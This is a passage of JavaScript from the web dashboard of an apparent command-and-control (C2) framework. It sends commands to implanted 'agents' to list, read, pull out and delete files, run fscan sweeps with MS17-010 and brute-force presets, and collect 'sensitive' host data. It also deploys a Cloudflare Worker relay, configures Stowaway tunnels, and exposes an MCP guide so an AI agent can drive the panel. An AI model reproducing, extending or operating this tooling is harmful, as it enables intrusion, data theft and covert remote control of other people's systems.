  document.getElementById("files-path").value = path;
  filesRefresh();
}

async function filesRefresh(gen = null, force = false) {
  if (!S.selectedAgent) return;
  const myGen = gen ?? S.agentGen;
  const path = document.getElementById("files-path").value.trim() || "/";
  const key  = filesAgentKey();
  if (key) localStorage.setItem(key, path);

  // Cache-first：有缓存直接渲染，不向 agent 发 ls（用户点刷新按钮才 force=true）。
  // 无缓存时发一次 ls 采集，之后切目录/切回来都走 DB。
  const r = await fetch(`/api/files/${S.selectedAgent.id}?path=${encodeURIComponent(path)}`);
  const d = await r.json().catch(() => ({}));
  if (myGen !== null && myGen !== S.agentGen) return;

  if (d.entries?.length) {
    renderFileList(path, d.entries);
    if (!force) return;   // 有缓存且非强制刷新 → 到此为止，不发命令
  } else {
    document.getElementById("file-status-bar").textContent =
      `等待 Agent 返回目录列表…  ·  ${path}`;
    renderBreadcrumb(path);
  }

  // Agent 掉线时不发命令——只读缓存（发出去也收不到回显，白白占通道）
  if (!isAgentOnline()) {
    document.getElementById("file-status-bar").textContent =
      `Agent 离线 · 显示缓存数据 · ${path}`;
    return;
  }

  const r2 = await fetch("/api/command", {
    method:  "POST",
    headers: { "Content-Type": "application/json" },
    body:    JSON.stringify({ agent_id: S.selectedAgent.id, command: `ls ${path}` }),
  });
  if (!r2.ok) {
    const d2 = await r2.json().catch(() => ({}));
    toast(`Refresh failed: ${d2.error || r2.status}`, "error");
    return;
  }
}

async function loadFileCache(path, gen = null) {
  if (!S.selectedAgent) return;
  const myGen = gen ?? S.agentGen;
  const r = await fetch(`/api/files/${S.selectedAgent.id}?path=${encodeURIComponent(path)}`);
  const d = await r.json();
  if (myGen !== null && myGen !== S.agentGen) return;   // stale — drop
  if (d.entries?.length) renderFileList(path, d.entries);
  else {
    document.getElementById("file-status-bar").textContent =
      `等待 Agent 返回目录列表…  ·  ${path}`;
    renderBreadcrumb(path);
  }
}

function renderBreadcrumb(path) {
  const bc = document.getElementById("files-breadcrumb");
  if (!bc) return;
  const parts = path.split("/").filter(Boolean);
  let html = `<span class="bc-seg" style="cursor:pointer;color:var(--accent)" onclick="filesGo('/')">/</span>`;
  let acc = "";
  parts.forEach(p => {
    acc += "/" + p;
    const target = acc;
    html += `<span style="color:var(--text-muted)"> › </span>
             <span class="bc-seg" style="cursor:pointer" onclick="filesGo('${esc(target)}')">${esc(p)}</span>`;
  });
  bc.innerHTML = html;
}

// Icon/type hint by extension (display only — real type comes from magic
// bytes at preview time, so extensionless Linux files preview correctly).
function fileHint(name) {
  const n = name.toLowerCase();
  if (/\.(conf|cfg|ini|env|list|sources)$/.test(n))    return { icon: "⚙️", type: "conf" };
  if (/\.(log|out|err)$/.test(n))                      return { icon: "📜", type: "log" };
  if (/\.(sh|bash|zsh)$/.test(n))                      return { icon: "🔧", type: "script" };
  if (/\.(py|pl|rb|js|rs|go|c|h)$/.test(n))            return { icon: "🐍", type: "code" };
  if (/\.(json|xml|yaml|yml|toml)$/.test(n))           return { icon: "🗂", type: "data" };
  if (/\.(png|jpg|jpeg|gif|webp|svg|bmp)$/.test(n))    return { icon: "🖼", type: "image" };
  if (/\.(tar|gz|tgz|bz2|xz|zip|7z)$/.test(n))         return { icon: "📦", type: "archive" };
  if (/^\.?(bashrc|profile|env|passwd|shadow|hosts|fstab|crontab)/.test(n)) return { icon: "🔑", type: "system" };
  return { icon: "📄", type: "file" };
}

function renderFileList(path, entries) {
  document.getElementById("files-path").value = path;
  document.getElementById("file-status-bar").textContent =
    `${entries.length} item(s)  ·  ${path}`;
  renderBreadcrumb(path);

  // Sort: dirs first, then files alphabetically
  entries.sort((a, b) => {
    if (a.is_dir !== b.is_dir) return a.is_dir ? -1 : 1;
    return a.name.localeCompare(b.name);
  });

  const tbody = document.getElementById("files-body");
  tbody.innerHTML = entries.map(e => {
    const isDir = e.is_dir;
    const name  = esc(e.name);
    const hint  = fileHint(e.name);
    const size  = isDir ? "—" : fmtSize(e.size || 0);
    const icon  = isDir ? "📁" : hint.icon;
    const cls   = isDir ? "file-name dir" : "file-name";
    // Click a directory name → enter; click a FILE name → preview (no download popup)
    const open  = isDir
      ? `onclick="enterDir('${esc(e.name)}')"`
      : `onclick="previewFile('${esc(e.name)}')" style="cursor:zoom-in" title="预览"`;
    const acts  = isDir
      ? `<button class="btn-sm" onclick="enterDir('${esc(e.name)}')">Open</button>`
      : `<button class="btn-sm" onclick="previewFile('${esc(e.name)}')">👁 Preview</button>
         <button class="btn-sm" onclick="downloadFile('${esc(e.name)}')" title="取回到 Library">⬇</button>
         <button class="btn-sm" title="Upload via sendit.sh → auto-download" onclick="senditFile('${esc(e.name)}')">🌐</button>
         <button class="btn-sm btn-danger" onclick="deleteFile('${esc(e.name)}')">🗑</button>`;
    return `<tr>
      <td><span class="${cls}" ${open}>${icon} ${name}</span></td>
      <td class="td-muted">${isDir ? "DIR" : hint.type}</td>
      <td class="td-muted">${size}</td>
      <td style="display:flex;gap:4px">${acts}</td>
    </tr>`;
  }).join("");
}

function enterDir(name) {
  const cur  = document.getElementById("files-path").value.trim() || "/";
  const next = cur === "/" ? `/${name}` : `${cur}/${name}`;
  document.getElementById("files-path").value = next;
  filesRefresh();
}

function filesGoUp() {
  const cur = document.getElementById("files-path").value.trim() || "/";
  if (cur === "/") return;
  const idx    = cur.lastIndexOf("/");
  const parent = idx <= 0 ? "/" : cur.slice(0, idx);
  document.getElementById("files-path").value = parent;
  filesRefresh();
}

async function downloadFile(name) {
  if (!S.selectedAgent) return;
  const path = document.getElementById("files-path").value.trim() || "/";
  const full = path === "/" ? `/${name}` : `${path}/${name}`;
  await sendRaw(`upload ${full}`);
  toast(`Download request sent → file will appear in Library`, "info");
}

async function previewFile(name) {
  if (!S.selectedAgent) return;
  const path = document.getElementById("files-path").value.trim() || "/";
  const full = path === "/" ? `/${name}` : `${path}/${name}`;
  showPreviewLoading(full);
  await sendRaw(`readfile ${full}`);
}

async function deleteFile(name) {
  if (!S.selectedAgent) return;
  if (!confirm(`确认删除 ${agentTag()} 上的文件？\n\n  ${name}\n\n此操作不可撤销。`)) return;
  const path = document.getElementById("files-path").value.trim() || "/";
  const full = path === "/" ? `/${name}` : `${path}/${name}`;
  await sendRaw(`rm -f "${full}"`);
  toast(`已发送删除命令 ${agentTag()} ${name}`, "info");
}

// ── File preview modal (magic-byte sniffed) ─────────────────────────────────

const _previewState = { bytes: null, mime: "", filename: "preview.bin" };

function showPreviewLoading(fullPath) {
  const modal = document.getElementById("preview-modal");
  if (!modal) return;
  modal.style.display = "flex";
  document.getElementById("preview-kind-badge").textContent = "…";
  document.getElementById("preview-path").textContent = fullPath;
  document.getElementById("preview-size").textContent = "loading";
  document.getElementById("preview-dl-btn").style.display = "none";
  document.getElementById("preview-body").innerHTML =
    `<div style="padding:40px;text-align:center;color:var(--text-muted);font-size:12px">
       ⏳ 正在通过 C2 通道读取文件…</div>`;
  _previewState.bytes = null;
}

function closePreview() {
  const modal = document.getElementById("preview-modal");
  if (modal) modal.style.display = "none";
  const body = document.getElementById("preview-body");
  if (body) body.innerHTML = "";   // release any blob object URLs
}

function b64ToBytes(b64) {
  const bin = atob(b64);
  const u8  = new Uint8Array(bin.length);
  for (let i = 0; i < bin.length; i++) u8[i] = bin.charCodeAt(i);
  return u8;
}

// Sniff content kind from the first bytes — works for extensionless files.
function sniffKind(u8, name) {
  const s = u8.length >= 16 ? u8.subarray(0, 16) : u8;
  const hex = Array.from(s).map(b => b.toString(16).padStart(2, "0")).join("");
  const ascii = Array.from(s).map(b => (b >= 32 && b < 127) ? String.fromCharCode(b) : "").join("");
  if (hex.startsWith("89504e47")) return { kind: "IMAGE", mime: "image/png",  ext: "png" };
  if (hex.startsWith("ffd8ff"))   return { kind: "IMAGE", mime: "image/jpeg", ext: "jpg" };
  if (ascii.startsWith("GIF8"))   return { kind: "IMAGE", mime: "image/gif",  ext: "gif" };
  if (ascii.startsWith("RIFF") && ascii.endsWith("WEBP")) return { kind: "IMAGE", mime: "image/webp", ext: "webp" };
  if (ascii.startsWith("%PDF"))   return { kind: "PDF",   mime: "application/pdf", ext: "pdf" };
  if (ascii.startsWith("<svg") || ascii.startsWith("<?xml")) return { kind: "IMAGE", mime: "image/svg+xml", ext: "svg" };
  if (hex.startsWith("1f8b"))     return { kind: "GZIP",  mime: "application/gzip", ext: "gz" };
  if (ascii.startsWith("ustar"))  return { kind: "TAR",   mime: "application/x-tar", ext: "tar" };
  if (hex.startsWith("7f454c46")) return { kind: "ELF",   mime: "application/x-elf", ext: "elf" };
  // Zip family (jar/docx/xlsx/apk...)
  if (hex.startsWith("504b0304") || hex.startsWith("52617221")) return { kind: "ARCHIVE", mime: "application/zip", ext: "zip" };
  if (name && /\.(json)$/i.test(name)) return { kind: "TEXT", mime: "text/plain", ext: "json" };
  return { kind: "TEXT", mime: "text/plain", ext: "txt" };
}

function hexDump(u8, limit = 2048) {
  let out = "";
  const n = Math.min(u8.length, limit);
  for (let i = 0; i < n; i += 16) {
    const row = u8.subarray(i, i + 16);
    const h = Array.from(row).map(b => b.toString(16).padStart(2, "0")).join(" ").padEnd(47, " ");
    const a = Array.from(row).map(b => (b >= 32 && b < 127) ? String.fromCharCode(b) : ".").join("");
    out += i.toString(16).padStart(8, "0") + "  " + h + "  |" + a + "|\n";
  }
  if (u8.length > limit) out += `… 共 ${u8.length} 字节（仅显示前 ${limit} 字节）\n`;
  return out;
}

function openPreviewModal(payload) {
  const modal = document.getElementById("preview-modal");
  if (!modal || modal.style.display === "none") return;   // nobody asked for a preview
  const bodyEl = document.getElementById("preview-body");
  const badge  = document.getElementById("preview-kind-badge");
  const path   = payload.path || "preview";
  const name   = path.split("/").pop() || "preview.bin";

  document.getElementById("preview-path").textContent = path;
  document.getElementById("preview-size").textContent = fmtSize(payload.size || 0);
  _previewState.filename = name;

  // Text path: agent sent valid UTF-8 content directly
  if (payload.content != null) {
    let text = payload.content;
    let kind = sniffKind(b64ToBytes(btoa(unescape(encodeURIComponent(text)))), name).kind;
    if (/\.json$/i.test(name)) {
      try { text = JSON.stringify(JSON.parse(text), null, 2); kind = "JSON"; } catch {}
    }
    badge.textContent = kind === "TEXT" ? "TEXT" : kind;
    bodyEl.innerHTML =
      `<pre style="margin:0;padding:14px;font-family:var(--mono);font-size:11px;line-height:1.55;color:#c9d1d9;white-space:pre-wrap;word-break:break-all">${esc(text)}</pre>`;
    return;
  }

  // Binary path: decode base64 and sniff magic bytes
  if (!payload.b64) { closePreview(); return; }
  const u8 = b64ToBytes(payload.b64);
  const sn = sniffKind(u8, name);
  _previewState.bytes = u8;
  _previewState.mime  = sn.mime;
  badge.textContent = sn.kind;
  document.getElementById("preview-dl-btn").style.display = "inline-block";

  if (sn.kind === "IMAGE") {
    const blob = new Blob([u8], { type: sn.mime });
    const url  = URL.createObjectURL(blob);
    bodyEl.innerHTML =
      `<div style="display:flex;align-items:center;justify-content:center;min-height:300px;padding:16px;background:#111">
         <img src="${url}" style="max-width:100%;max-height:70vh;border-radius:4px" alt="preview">
       </div>`;
    return;
  }
  if (sn.kind === "PDF") {
    const blob = new Blob([u8], { type: "application/pdf" });
    const url  = URL.createObjectURL(blob);
    bodyEl.innerHTML =
      `<iframe src="${url}" style="width:100%;height:70vh;border:0"></iframe>`;
    return;
  }
  // ELF / archive / gzip / unknown binary → hex dump (always previewable,
  // never a forced download popup)
  const desc = {
    ELF: "ELF 可执行文件", GZIP: "gzip 压缩数据", TAR: "tar 归档",
    ARCHIVE: "zip 压缩包",
  }[sn.kind] || "二进制文件";
  bodyEl.innerHTML =
    `<div style="padding:8px 14px;font-size:11px;color:var(--text-muted);border-bottom:1px solid var(--border)">
       ${desc} · magic 嗅探（与扩展名无关）
     </div>
     <pre style="margin:0;padding:14px;font-family:var(--mono);font-size:11px;line-height:1.5;color:#c9d1d9">${esc(hexDump(u8))}</pre>`;
}

function previewDownload() {
  if (!_previewState.bytes) return;
  const blob = new Blob([_previewState.bytes], { type: _previewState.mime || "application/octet-stream" });
  const url  = URL.createObjectURL(blob);
  const a    = document.createElement("a");
  a.href = url;
  a.download = _previewState.filename;
  a.click();
  setTimeout(() => URL.revokeObjectURL(url), 5000);
}

async function uploadFile() {
  const input = document.getElementById("file-upload-input");
  const file  = input.files[0];
  if (!file || !S.selectedAgent) return;
  const dest = document.getElementById("files-path").value.trim() || "/tmp";
  const form = new FormData();
  form.append("agent_id",  S.selectedAgent.id);
  form.append("dest_path", dest);
  form.append("file",      file);
  toast(`Uploading ${file.name}…`, "info");
  const r = await fetch("/api/files/upload", { method: "POST", body: form });
  const d = await r.json();
  toast(d.ok ? `Upload started: ${file.name}` : `Error: ${d.error}`,
        d.ok ? "success" : "error");
  input.value = "";
}

// sendit.sh: upload from agent to temp URL, controller auto-downloads it back
async function senditFile(name) {
  if (!S.selectedAgent) return;
  const path = document.getElementById("files-path").value.trim() || "/";
  const full = path === "/" ? `/${name}` : `${path}/${name}`;

  const r = await fetch("/api/files/sendit", {
    method:  "POST",
    headers: { "Content-Type": "application/json" },
    body:    JSON.stringify({
      agent_id: S.selectedAgent.id,
      filepath: full,
      filename: name,
    }),
  });
  const d = await r.json();
  if (d.ok) {
    toast(`🌐 ${name} upload command sent — will auto-download when agent responds`, "info");
  } else {
    toast(d.error || "sendit failed", "error");
  }
}

// ── Scan (fscan) ────────────────────────────────────────────────────────────

// Track command_ids that belong to scan actions so SSE routes them to scan output
const _scanCmdIds = new Set();

const _SCAN_EXAMPLES = [
  {
    label: "Full scan C segment",
    args:  "-h 192.168.1.1/24 -np -o /tmp/r.txt",
  },
  {
    label: "Common ports only (fast)",
    args:  "-h 192.168.1.1/24 -np -nobr -nopoc -p 22,80,443,3306,3389,6379,8080,8443 -o /tmp/r.txt",
  },
  {
    label: "MS17-010 scan",
    args:  "-h 192.168.1.1/24 -m ms17010 -np -o /tmp/r.txt",
  },
  {
    label: "Service brute-force (ssh/ftp/mysql/redis)",
    args:  "-h 192.168.1.1/24 -m ssh,ftp,mysql,redis -np -nopoc -o /tmp/r.txt",
  },
  {
    label: "Web fingerprint + vuln scan",
    args:  "-h 192.168.1.1/24 -m webonly -np -nobr -o /tmp/r.txt",
  },
];

function _renderScanExamples() {
  const el = document.getElementById("scan-examples");
  if (!el) return;
  el.innerHTML = _SCAN_EXAMPLES.map((ex, i) => {
    const safe = ex.args.replace(/&/g,"&amp;").replace(/"/g,"&quot;");
    return `<div style="display:flex;align-items:flex-start;gap:6px;margin-bottom:8px;padding:6px 8px;background:var(--bg-2);border-radius:4px;border:1px solid var(--border)">
      <div style="flex:1;min-width:0">
        <div style="font-size:11px;color:var(--text-muted);margin-bottom:3px">${esc(ex.label)}</div>
        <code style="font-size:11px;color:var(--text-dim);word-break:break-all;line-height:1.5">${esc(ex.args)}</code>
      </div>
      <button class="btn-sm" style="flex-shrink:0;margin-top:1px" title="Copy to args box"
        onclick="(function(){document.getElementById('sc-args').value=${JSON.stringify(ex.args)};toast('Copied to args','success')})()">📋</button>
    </div>`;
  }).join("");
}

function scanAppendOutput(text, ts) {
  const pre = document.getElementById("sc-output");
  if (!pre) return;
  const isBlank = pre.textContent.startsWith("Scan output will appear");
  if (isBlank) pre.textContent = "";
  pre.textContent += (pre.textContent ? "\n" : "") + text;
  pre.scrollTop = pre.scrollHeight;
  const tsEl = document.getElementById("sc-out-ts");
  if (tsEl && ts) tsEl.textContent = ts;

  // Auto-save to Library/scans/ so it appears in the report
  if (!S.selectedAgent) return;
  const readCmd = document.getElementById("sc-read-cmd")?.value?.trim() || "";
  fetch(`/api/scan/save_result/${S.selectedAgent.id}`, {
    method: "POST", headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ content: text, label: readCmd }),
  }).then(r => r.json()).then(d => {
    if (d.ok) toast(`Scan result saved → Library/scans/ (${d.filename?.split("/").pop()})`, "info");
  }).catch(() => {});
}

function scanClearOutput() {
  const pre = document.getElementById("sc-output");
  if (pre) pre.textContent = "Scan output will appear here after clicking 📄 Read…";
  const tsEl = document.getElementById("sc-out-ts");
  if (tsEl) tsEl.textContent = "";
}

async function onScanTab() {
  _renderScanExamples();
  const r = await fetch("/api/scan/config").catch(() => null);
  if (r && r.ok) {
    const d = await r.json().catch(() => ({}));
    if (d.scan_url) {
      const el = document.getElementById("sc-url");
      if (el) el.value = d.scan_url;
    }
  }
}

async function scanSaveConfig() {
  const url = (document.getElementById("sc-url")?.value || "").trim();
  if (!url) { toast("URL 为空则沿用已保存的地址；要清空请填 -", "info"); return; }
  const r = await fetch("/api/scan/config", {
    method: "POST", headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ scan_url: url }),
  });
  toast(r.ok ? "URL saved" : "Save failed", r.ok ? "success" : "error");
}

async function scanAction(action) {
  if (!S.selectedAgent) { toast("Select an agent first", "error"); return; }
  const aid  = S.selectedAgent.id;
  const args = (document.getElementById("sc-args")?.value || "").trim();

  if ((action === "deploy" || action === "run") && !args) {
    toast("Enter scan arguments first", "error"); return;
  }

  const eps = { deploy:"/api/scan/deploy", run:"/api/scan/run", stop:"/api/scan/stop", sweep:"/api/scan/sweep" };
  const body = { agent_id: aid };
  if (args && (action === "deploy" || action === "run")) body.args = args;

  const r = await fetch(eps[action], {
    method: "POST", headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });
  const d = await r.json().catch(() => ({}));
  if (!r.ok) { toast(d.error || `${action} failed`, "error"); return; }

  // Track command_id so SSE routes response to scan output area
  if (d.command_id) _scanCmdIds.add(d.command_id);

  const labels = {
    deploy: "⬇ Download & Run sent — scan running in background",
    run:    "▶ Run sent — scan running in background",
    stop:   "⏹ Stop sent",
    sweep:  "🧹 Sweep sent — binary removed",
  };
  toast(labels[action] || "Sent", action === "sweep" ? "warning" : "success");
}

async function scanReadResult() {
  if (!S.selectedAgent) { toast("Select an agent first", "error"); return; }
  const cmd = (document.getElementById("sc-read-cmd")?.value || "").trim();
  if (!cmd) { toast("Enter a read command (e.g. cat /tmp/r.txt)", "error"); return; }

  const r = await fetch("/api/scan/result", {
    method: "POST", headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ agent_id: S.selectedAgent.id, cmd }),
  });
  const d = await r.json().catch(() => ({}));
  if (!r.ok) { toast(d.error || "Failed", "error"); return; }

  // Track command_id → output goes to scan output area, not Terminal
  if (d.command_id) _scanCmdIds.add(d.command_id);
  toast("Read command sent — output appears on the right", "info");
}

// ── SysInfo ────────────────────────────────────────────────────────────────

async function onSysInfoTab() {
  if (!S.selectedAgent) return;
  await refreshSysinfoHistory();

  const r = await fetch(`/api/sysinfo/${S.selectedAgent.id}`);
  const d = await r.json();

  if (d.latest) {
    renderSysinfo(d.latest.content, d.latest.collected_at);
  } else if (!S.sysinfoRequested) {
    S.sysinfoRequested = true;
    document.getElementById("sysinfo-content").innerHTML =
      '<div style="padding:16px" class="spinner-wrap"><div class="spinner"></div><span>Collecting system info…</span></div>';
    await sendRaw("sysinfo");
    setTimeout(() => {
      const el = document.getElementById("sysinfo-content");
      if (el.querySelector(".spinner-wrap")) {
        el.innerHTML = `<div style="padding:16px;color:var(--yellow)">
          ⚠ No response after 120 s — agent may be offline.
          <button class="btn-sm" onclick="retrySysinfo()">↺ Retry</button></div>`;
      }
    }, 120_000);
  }
}

function retrySysinfo() {
  S.sysinfoRequested = false;
  onSysInfoTab();
}

async function uninstallAgent() {
  if (!S.selectedAgent) { toast("请先在左侧选择 agent", "error"); return; }
  const name = S.selectedAgent.hostname || S.selectedAgent.id;
  const ok = confirm(`⚠ 确认卸载 ${agentTag()} 上的 Agent？\n\n将执行：\n- 移除持久化（crontab / systemd / bashrc）\n- 删除二进制文件\n- Agent 不再回连\n\nAgent 条目会保留在列表中供查阅。`);
  if (!ok) return;
  const ok2 = confirm(`最后确认 ${agentTag()}：此操作不可撤销，真的卸载？`);
  if (!ok2) return;
  const r = await fetch("/api/command", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ agent_id: S.selectedAgent.id, command: "uninstall" }),
  });
  if (r.ok) {
    toast("Uninstall command sent — agent will self-destruct", "warning");
  } else {
    const d = await r.json().catch(() => ({}));
    toast(d.error || "Failed to send uninstall", "error");
  }
}

async function triggerSysinfo() {
  if (!S.selectedAgent) return;
  S.sysinfoRequested = true;
  document.getElementById("sysinfo-content").innerHTML =
    '<div style="padding:16px" class="spinner-wrap"><div class="spinner"></div><span>Refreshing…</span></div>';
  await sendRaw("sysinfo");
}

async function refreshSysinfoHistory() {
  if (!S.selectedAgent) return;
  const r   = await fetch(`/api/sysinfo/${S.selectedAgent.id}`);
  const d   = await r.json();
  const sel = document.getElementById("sysinfo-history-sel");
  const hist = d.history || [];
  S.sysinfoHistory = hist;  // consumed by loadSysinfoSnapshot for titles
  if (hist.length > 1) {
    sel.style.display = "block";
    sel.innerHTML = '<option value="">Latest</option>' +
      hist.map(h => `<option value="${h.id}">${h.collected_at}</option>`).join("");
  } else {
    sel.style.display = "none";
  }
}

async function loadSysinfoSnapshot() {
  if (!S.selectedAgent) return;
  const sid = document.getElementById("sysinfo-history-sel").value;
  if (!sid) {
    const r = await fetch(`/api/sysinfo/${S.selectedAgent.id}`);
    const d = await r.json();
    if (d.latest) renderSysinfo(d.latest.content, d.latest.collected_at);
    return;
  }
  const r = await fetch(`/api/sysinfo/${S.selectedAgent.id}/${sid}`);
  const d = await r.json();
  if (d.content) {
    // Find the timestamp for this snapshot from the history list
    const entry = (S.sysinfoHistory || []).find(h => String(h.id) === String(sid));
    renderSysinfo(d.content, entry ? entry.collected_at : `snapshot #${sid}`);
  }
}

function renderSysinfo(content, ts) {
  document.getElementById("sysinfo-title").textContent = `System Info — ${ts}`;
  const el = document.getElementById("sysinfo-content");
  el.textContent = content;
}

// ── Sensitive ──────────────────────────────────────────────────────────────

async function onSensitiveTab() {
  if (!S.selectedAgent) return;
  await refreshSensitiveHistory();

  const r = await fetch(`/api/sensitive/${S.selectedAgent.id}`);
  const d = await r.json();

  if (d.latest) {
    renderSensitive(d.latest.content, d.latest.collected_at);
  } else if (!S.sensitiveRequested) {
    S.sensitiveRequested = true;
    document.getElementById("sensitive-content").innerHTML =
      '<div style="padding:16px" class="spinner-wrap"><div class="spinner"></div><span>Collecting sensitive info…</span></div>';
    await sendRaw("sensitive");
    // Same 120s timeout as SysInfo
    setTimeout(() => {
      const el = document.getElementById("sensitive-content");
      if (el && el.querySelector(".spinner-wrap")) {
        el.innerHTML = `<div style="padding:16px;color:var(--yellow)">
          ⚠ No response after 120 s — agent may be offline.
          <button class="btn-sm" onclick="retrySensitive()">↺ Retry</button></div>`;
      }
    }, 120_000);
  }
}

async function triggerSensitive() {
  if (!S.selectedAgent) return;
  S.sensitiveRequested = true;
  document.getElementById("sensitive-content").innerHTML =
    '<div style="padding:16px" class="spinner-wrap"><div class="spinner"></div><span>Recollecting…</span></div>';
  await sendRaw("sensitive");
}

function retrySensitive() {
  S.sensitiveRequested = false;
  onSensitiveTab();
}

async function refreshSensitiveHistory() {
  if (!S.selectedAgent) return;
  const r    = await fetch(`/api/sensitive/${S.selectedAgent.id}`);
  const d    = await r.json();
  const sel  = document.getElementById("sensitive-history-sel");
  const hist = d.history || [];
  S.sensitiveHistory = hist;  // consumed by loadSensitiveSnapshot for titles
  if (hist.length > 1) {
    sel.style.display = "block";
    sel.innerHTML = '<option value="">Latest</option>' +
      hist.map(h => `<option value="${h.id}">${h.collected_at}</option>`).join("");
  } else {
    sel.style.display = "none";
  }
}

async function loadSensitiveSnapshot() {
  if (!S.selectedAgent) return;
  const sid = document.getElementById("sensitive-history-sel").value;
  if (!sid) {
    const r = await fetch(`/api/sensitive/${S.selectedAgent.id}`);
    const d = await r.json();
    if (d.latest) renderSensitive(d.latest.content, d.latest.collected_at);
    return;
  }
  const r = await fetch(`/api/sensitive/${S.selectedAgent.id}/${sid}`);
  const d = await r.json();
  if (d.content) {
    const entry = (S.sensitiveHistory || []).find(h => String(h.id) === String(sid));
    renderSensitive(d.content, entry ? entry.collected_at : `snapshot #${sid}`);
  }
}

function renderSensitive(content, ts) {
  document.getElementById("sensitive-title").textContent = `Sensitive Information — ${ts}`;
  const el = document.getElementById("sensitive-content");

  // Parse sections
  const sections = [];
  let cur = { title: "General", lines: [] };
  for (const line of content.split("\n")) {
    const t = line.trim();
    if (/^\[.+\]$/.test(t) || /^={3,}/.test(t) || /^-{3,}/.test(t)) {
      if (cur.lines.join("").trim()) sections.push({ ...cur });
      cur = { title: t.replace(/[\[\]=\-]/g, "").trim() || t, lines: [] };
    } else {
      cur.lines.push(line);
    }
  }
  if (cur.lines.join("").trim()) sections.push(cur);

  if (sections.length <= 1) {
    el.innerHTML = `<div class="section-content">${esc(content)}</div>`;
    return;
  }

  el.innerHTML = sections.filter(s => s.lines.join("").trim()).map(s => `
    <div class="section-block">
      <div class="section-title">${esc(s.title)}</div>
      <div class="section-content">${esc(s.lines.join("\n").trim())}</div>
    </div>`).join("");
}

// ── Cloudflare Worker admin (one-click relay deployment) ─────────────────────

async function loadWorkerAdmin() {
  const r = await fetch("/api/worker_admin/state").catch(() => null);
  if (!r || !r.ok) return;
  const d = await r.json();
  const st = document.getElementById("wka-status");
  if (st) st.textContent = d.cf_token_masked ? `Token 已保存（${d.cf_token_masked}）` : "未配置 Token";
  const nm = document.getElementById("wka-name");
  if (nm && d.worker_name) nm.value = d.worker_name;
  const authEl = document.getElementById("wka-auth");
  const pathEl = document.getElementById("wka-path");
  if (authEl) {
    authEl.value = "";
    authEl.placeholder = d.worker_secret_set ? "已设置，留空=沿用" : "relay shared secret";
  }
  if (pathEl) {
    pathEl.value = "";
    pathEl.placeholder = d.worker_path_set ? "已设置，留空=沿用" : "PATH_SECRET";
  }
  const log = document.getElementById("wka-log");
  if (log && d.last_deploy_log) {
    log.style.display = "block";
    log.textContent = d.last_deploy_log;
  }
}

function wkaGen(id, nbytes) {
  const bytes = new Uint8Array(nbytes);
  crypto.getRandomValues(bytes);
  const hex = [...bytes].map(b => b.toString(16).padStart(2, "0")).join("");
  document.getElementById(id).value = hex.slice(0, nbytes * 2);
}

async function wkaDeploy() {
  const btn = event.target;
  const log = document.getElementById("wka-log");
  log.style.display = "block";
  log.textContent = "⏳ 部署中（建库→建表→上传→cron→启用，约 10–30 秒）…";
  btn.disabled = true;
  try {
    const body = {
      cf_token: document.getElementById("wka-token").value.trim(),
      worker_name: document.getElementById("wka-name").value.trim() || "c2relay",
      account_id: document.getElementById("wka-account").value.trim(),
      auto_save_settings: document.getElementById("wka-autocfg").checked,
    };
    const auth = document.getElementById("wka-auth").value.trim();
    const path = document.getElementById("wka-path").value.trim();
    if (auth) body.auth_secret = auth;
    if (path) body.path_secret = path;

    const r = await fetch("/api/worker_admin/deploy", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body),
    });
    const d = await r.json();
    let extra = "";
    if (d.full_url) {
      extra = d.secrets_written
        ? `\n\n🎉 中转地址：${d.full_url}\n   已写入 Settings + Builder。打开 Builder 确认是 🔀 双通道，核对待用 GitHub Token/Repo 后再编包。`
        : `\n\n🎉 中转地址：${d.full_url}\n   未自动写入。请把 URL / Secret / Path 填进 Settings 和 Builder。`;
    }
    log.textContent = (d.steps || []).join("\n") + extra;
    if (d.ok) toast("Worker 中转部署成功", "success");
    loadWorkerAdmin();
  } catch (e) {
    log.textContent += "\n✗ 请求失败：" + e;
  } finally {
    btn.disabled = false;
  }
}

// ── Tunnel ─────────────────────────────────────────────────────────────────

// ── MCP guide ───────────────────────────────────────────────────────────────

let _mcpGuideLoaded = false;

async function loadMcpGuide() {
  const r = await fetch("/api/mcp/guide").catch(() => null);
  if (!r || !r.ok) return;
  const d = await r.json();
  const g = document.getElementById("mcp-guide-block");
  const desc = document.getElementById("mcp-descriptor-block");
  const j = document.getElementById("mcp-json-block");
  if (g) g.textContent = d.guide_md;
  if (desc) desc.textContent = d.descriptor_json;
  if (j) j.textContent = d.client_json;
  const tools = document.getElementById("mcp-tools");
  if (tools && d.tools) {
    tools.innerHTML = d.tools.map(t => {
      const danger = t.name.startsWith("killswitch");
      return `<div style="display:flex;gap:8px;align-items:baseline;padding:6px 8px;border:1px solid var(--border);border-radius:5px">
        <code style="font-size:11px;color:${danger ? "var(--red)" : "var(--accent)"}">${esc(t.name)}</code>
        <span style="color:var(--text-muted);font-size:11px">${esc(t.desc)}</span>
      </div>`;
    }).join("");
  }
  _mcpGuideLoaded = true;
}

function mcpCopy(id) {
  const el = document.getElementById(id);
  if (!el) return;
  const text = el.textContent;
  if (navigator.clipboard && window.isSecureContext) {
    navigator.clipboard.writeText(text).catch(() => { el.select && el.select(); });
  } else {
    const ta = document.createElement("textarea");
    ta.value = text; document.body.appendChild(ta);
    ta.select(); document.execCommand("copy"); ta.remove();
  }
  toast("已复制到剪贴板，可直接粘贴给 AI agent", "success");
}

function mcpDownloadScript() {
  window.location.href = "/api/mcp/server_script";
}

async function loadTunnelConfig() {
  const r = await fetch("/api/settings");
  const d = await r.json();
  document.getElementById("tn-ip").value     = d.tunnel_ip     || "";
  document.getElementById("tn-port").value   = d.tunnel_port   || "9998";
  // Real persisted secret from the server; never invent a fallback — a wrong
  // hardcoded value here once shipped "123456" and tunnels silently failed.
  {
    const sec = document.getElementById("tn-secret");
    if (sec) {
      sec.value = "";
      sec.placeholder = d.tunnel_secret_set ? "已设置，留空=沿用" : "与服务端一致，留空不改";
      sec.type = "password";
    }
  }
  // Also load stowaway admin config
  await stowLoadConfig();
}

// ── Stowaway Admin (server-side) ──────────────────────────────────────────────

let _stowPollTimer = null;

async function stowLoadConfig() {
  const r = await fetch("/api/tunnel/admin/config").catch(() => null);
  if (!r || !r.ok) return;
  const d = await r.json();
  const lEl = document.getElementById("stow-listen");
